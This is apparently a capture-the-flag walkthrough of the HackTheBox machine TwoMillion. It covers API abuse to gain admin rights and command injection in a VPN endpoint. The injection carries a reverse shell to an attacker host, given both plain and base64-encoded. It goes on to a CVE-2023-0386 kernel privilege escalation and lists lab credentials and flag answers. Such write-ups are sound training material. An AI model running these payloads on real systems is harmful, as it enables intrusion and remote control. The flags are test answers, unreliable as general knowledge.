## Synopsis

**TwoMillion** is an Easy difficulty Linux machine released to celebrate two million users on [HackTheBox](https://www.hackthebox.com/). The machine features an old version of the platform. After hacking the invite code, an account can be created. The account is used to enumerate various API endpoints, one of which can elevate the user to administrator. With administrative access, command injection is possible in the admin VPN generation endpoint, obtaining a system shell. An `.env` file contains database credentials and, due to password reuse, attackers can log in as the admin user. The system kernel is outdated and [CVE-2023-0386](https://nvd.nist.gov/vuln/detail/CVE-2023-0386) can be used to obtain a root shell.

## Skills Required

- Basic JavaScript
- Basic PHP

## Skills Learned

- JavaScript Deobfuscation
- API Enumeration
- Command Injection
- System Enumeration
- [CVE-2023-0386](https://nvd.nist.gov/vuln/detail/CVE-2023-0386)

### Enumeration

Starting enumeration with `nmap`.

```bash
sudo nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv --source-port 53 10.10.11.221 -oA AllPorts
```

This command runs a **fast and stealthy SYN scan** across all 65,535 ports, showing only open ones. It is optimized for speed (5000 packets/sec, no DNS resolution or ping) and attempts to **evade firewalls** by simulating traffic from port 53, saving results in three file formats.

![Nmap all ports scan](writeups/htb/src/twomillion/TwoMillion_enumeraction_nmap.png)
![Nmap HTML report](writeups/htb/src/twomillion/TwoMillion_enumeration_nmap_html.png)

The scan reveals port 22 (SSH) and 80 (Nginx) open, which answers the first question.

- How many TCP ports are open?
  **Answer:** 2

A **deep and specific scan** on ports 22 and 80 can then be performed.

```bash
sudo nmap -p22,80 -sCV -Pn 10.10.11.221 -oN targeted
```

Its main purpose is to **identify exact software versions** on those ports and run **basic enumeration scripts**, saving a readable report.

![Nmap targeted scan](writeups/htb/src/twomillion/TwoMillion_enumeration_nmap_scan_vuln.png)

Accessing the identified vHost, we see the old HackTheBox website with login and join functionality.

![Old HTB version](writeups/htb/src/twomillion/TwoMillion_old_version.png)

Starting path enumeration by clicking Join and then `Join HTB`, we are redirected to `/invite`. Press `Ctrl + Shift + I` then go to `Network`.

![Invite page](writeups/htb/src/twomillion/TwoMillion_invite.png)

This appears to be the old HTB invite code page. Let's investigate further.

- What is the name of the JavaScript file loaded by the `/invite` page that has to do with invite codes?
  **Answer:** `inviteapi.min.js`

Looking at the page source code we can see the obfuscated script.

![Invite API JS](writeups/htb/src/twomillion/TwoMillion_inviteapijs.png)

To deobfuscate it, visit [beautifier.io](https://beautifier.io/).

![JS Beautify](writeups/htb/src/twomillion/TwoMillion_js-beautify.png)

There are two functions in the code. The second one is more interesting since it can make a `POST` request to `/api/v1/invite/how/to/generate`. We can call it from the browser console or use `curl`.

- What JavaScript function on the invite page returns the first hint about how to get an invite code? Don't include () in the answer.
  **Answer:** makeInviteCode

```bash
curl -sX POST http://2million.htb/api/v1/invite/how/to/generate
```

The result is in JSON format and contains encrypted data. The encryption type appears to be ROT13. You can use [rot13.com](https://rot13.com/), [CyberChef](https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,false,13)), or the browser console to decrypt it.

![Curl API generate](writeups/htb/src/twomillion/TwoMillion_curl_api_generate.png)

After decoding, the message says to generate the invite code by making a `POST` request to `/api/v1/invite/generate`.

![ROT13 decoded](writeups/htb/src/twomillion/TwoMillion_rot13.png)

```bash
curl -sX POST http://2million.htb/api/v1/invite/generate
```

The result appears to be Base64 encoded.

![Invite code](writeups/htb/src/twomillion/TwoMillion_code_invite.png)

- The endpoint in `makeInviteCode` returns encrypted data. That message provides another endpoint to query. That endpoint returns a `code` value encoded with a very common binary-to-text encoding format. What is the name of that encoding?
  **Answer:** base64

Enter the decoded invite code at `/invite` and click submit.

![Account created](writeups/htb/src/twomillion/TwoMillion_created_your_account.png)

Create your account and log in to see the dashboard.

![HTB Home](writeups/htb/src/twomillion/TwoMillion_home.png)

### Foothold

Going to `/home/access` we can see the section that allows the user to download and regenerate their VPN file.

![Generate VPN](writeups/htb/src/twomillion/TwoMillion_generatevpn.png)

Pressing `Ctrl + Shift + I` and going to `Network`, we can see which API is called in the background. Also go to `Storage` and copy the session cookie to work from the console.

![Caido intercept](writeups/htb/src/twomillion/TwoMillion_Caido.png)

- What is the path to the endpoint the page uses when a user clicks on "Connection Pack"?
  **Answer:** `/api/v1/user/vpn/generate`

Now let's request `/api/v1` from the console using our session cookie.

```bash
curl -sX GET "http://2million.htb/api/v1" --cookie "PHPSESSID=<COOKIE>" | jq
```

We get a list of available API endpoints, with some interesting admin-specific ones.

![API list](writeups/htb/src/twomillion/TwoMillion_Console_cookie_api_list.png)

- How many API endpoints are there under `/api/v1/admin`?
  **Answer:** 3

Testing `/admin/auth` confirms we are not an admin yet.

![Unauthorized](writeups/htb/src/twomillion/TwoMillion_unauthorized_admin.png)

Let's try `/admin/settings/update` using PUT requests to elevate our account:

```bash
curl -v -X PUT http://2million.htb/api/v1/admin/settings/update \
  --cookie "PHPSESSID=<COOKIE>" | jq

curl -v -X PUT http://2million.htb/api/v1/admin/settings/update \
  --cookie "PHPSESSID=<COOKIE>" \
  --header "Content-Type: application/json" | jq

curl -v -X PUT http://2million.htb/api/v1/admin/settings/update \
  --cookie "PHPSESSID=<COOKIE>" \
  --header "Content-Type: application/json" \
  --data '{"email":"<YOUR_ACCOUNT>"}' | jq

curl -v -X PUT http://2million.htb/api/v1/admin/settings/update \
  --cookie "PHPSESSID=<COOKIE>" \
  --header "Content-Type: application/json" \
  --data '{"email":"<YOUR_ACCOUNT>", "is_admin": 1}' | jq
```

Each request reveals a new error: first invalid Content-Type, then missing email, then missing `is_admin`. After providing all parameters we are now an admin.

![is_admin true](writeups/htb/src/twomillion/TwoMillion_is_admin_true.png)

- What API endpoint can change a user account to an admin account?
  **Answer:** `/api/v1/admin/settings/update`

Now with admin permissions, let's test `/admin/vpn/generate`:

```bash
curl -sX GET "http://2million.htb/api/v1/admin/vpn/generate" \
  --cookie "PHPSESSID=<COOKIE>" | jq
```

The response says a `username` parameter is missing. After supplying a username, a VPN config file is generated. If the VPN generation uses PHP `exec` or `system` without proper filtering, command injection may be possible.

![New generate VPN](writeups/htb/src/twomillion/TwoMillion_new_generate_vpn.png)

Let's test by injecting `;id;` after the username:

```bash
curl -sX GET "http://2million.htb/api/v1/admin/vpn/generate" \
  --cookie "PHPSESSID=<COOKIE>" \
  --header "Content-Type: application/json" \
  --data '{"username": "ch4rum;id;"}' | jq
```

![Command injection confirmed](writeups/htb/src/twomillion/TwoMillion_injection_command.png)

Command injection is confirmed. Now let's get a reverse shell. Set up a listener first:

```bash
nc -lvp 4433
```

Then send the payload:

```bash
curl -sX GET "http://2million.htb/api/v1/admin/vpn/generate" \
  --cookie "PHPSESSID=<COOKIE>" \
  --header "Content-Type: application/json" \
  --data '{"username": "ch4rum;bash -c \"bash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1\";"}' | jq
```

Alternatively, send the command in Base64 to avoid quoting issues:

```bash
--data '{"username":"ch4rum;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQo= | base64 -d | bash;"}'
```

![Reverse shell](writeups/htb/src/twomillion/TwoMillion_reverse_shell.png)

- What API endpoint has a command injection vulnerability in it?
  **Answer:** `/api/v1/admin/vpn/generate`

### Lateral Movement

Enumerating the web directory reveals a `.env` file containing database credentials for a user named admin.

![.env file](writeups/htb/src/twomillion/TwoMillion_.env.png)

- What file is commonly used in PHP applications to store environment variable values?
  **Answer:** `.env`

Listing `/etc/passwd` confirms the admin user exists on the system.

![List users](writeups/htb/src/twomillion/TwoMillion_list_users.png)

Due to password reuse, we can log in as admin via SSH or `su` using the password **SuperDuperPass123**.

![First flag](writeups/htb/src/twomillion/TwoMillion_firt_flag.png)

- Submit the flag located in the admin user's home directory.
  **Answer:** `da34bf61abc89ed43dc0834a8927c665`

### Privilege Escalation

Enumerating the system, we find `/var/mail/admin` which contains an email from `ch4p` informing the admin about recent serious kernel exploits, specifically mentioning **OverlayFS/FUSE**.

```bash
find / -user admin 2>/dev/null | grep -vE "sys|proc"
```

![Search email](writeups/htb/src/twomillion/TwoMillion_search_email_or_vuln.png)

```bash
cat /var/mail/admin
```

![Cat mail](writeups/htb/src/twomillion/TwoMillion_cat_mail.png)

- What is the email address of the sender of the email sent to admin?
  **Answer:** `ch4p@2million.htb`

Searching for "overlayfs fuse exploit" leads to [CVE-2023-0386](https://nvd.nist.gov/vuln/detail/CVE-2023-0386), a Linux kernel vulnerability. The machine uses kernel version 5.15.70, which falls within the affected range (up to 5.15.0-70.77 for Jammy).

- What is the 2023 CVE ID for a vulnerability that allows an attacker to move files in the Overlay file system while maintaining metadata like the owner and SetUID bits?
  **Answer:** `CVE-2023-0386`

Clone the exploit and transfer it to the target:

```bash
git clone https://github.com/xkaneiki/CVE-2023-0386
zip vuln.zip -r CVE-2023-0386
```

![Clone CVE](writeups/htb/src/twomillion/TwoMillion_clone_cve.png)

On the target machine, download and extract:

```bash
wget http://<IP>:<PORT>/vuln.zip
unzip vuln.zip
cd CVE-2023-0386
make all
```

![Download vuln](writeups/htb/src/twomillion/TwoMillion_donwload_vuln.png)
![Make all](writeups/htb/src/twomillion/TwoMillion_make_all.png)

Open two terminals connected to the target. In the first terminal run:

```bash
./fuse ./ovlcap/lower ./gc
```

In the second terminal run:

```bash
./exp
```

![Privilege escalation](writeups/htb/src/twomillion/TwoMillion_privilege_scalation.png)

We now have a root shell. Navigate to `/root` to find the flag.

![Root flag](writeups/htb/src/twomillion/TwoMillion_root_flag.png)

- Submit the flag located in root's home directory.
  **Answer:** `58e25ea88980e0fee22ba2601253442f`

---

## Bonus Questions

- What is the version of the GLIBC library on TwoMillion?
  **Answer:** 2.35

```bash
ldd --version
```

- What is the CVE ID for the 2023 buffer overflow vulnerability in the GNU C dynamic loader?
  **Answer:** `CVE-2023-4911`

- With a shell as admin or www-data, find a POC for Looney Tunables. What is the name of the environment variable that triggers the buffer overflow?
  **Answer:** `GLIBC_TUNABLES`